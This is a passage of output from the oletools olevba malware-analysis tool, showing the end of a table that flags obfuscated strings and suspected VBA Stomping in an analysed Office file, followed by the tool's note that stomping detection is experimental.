|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

